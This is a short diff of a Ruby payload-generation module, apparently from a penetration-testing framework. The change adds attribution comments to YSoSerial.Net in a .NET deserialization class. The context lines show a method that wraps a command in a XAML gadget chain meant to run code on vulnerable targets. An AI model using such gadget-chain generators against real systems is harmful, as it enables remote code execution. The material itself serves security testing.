@@ -3,6 +3,10 @@ module Util
 
 require 'bindata'
 
+#
+# Much of this code is based on the YSoSerial.Net project
+# see: https://github.com/pwntester/ysoserial.net
+#
 class DotNetDeserialization
   DEFAULT_FORMATTER = :LosFormatter
   DEFAULT_GADGET_CHAIN = :TextFormattingRunProperties
@@ -231,6 +235,7 @@ class DotNetDeserialization
   def self.generate_gadget_chain(cmd, gadget_chain: DEFAULT_GADGET_CHAIN)
     case gadget_chain
     when :TextFormattingRunProperties
+      # see: https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TextFormattingRunPropertiesGenerator.cs
       resource_dictionary = Nokogiri::XML(<<-EOS, nil, nil, options=Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
         <ResourceDictionary
           xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
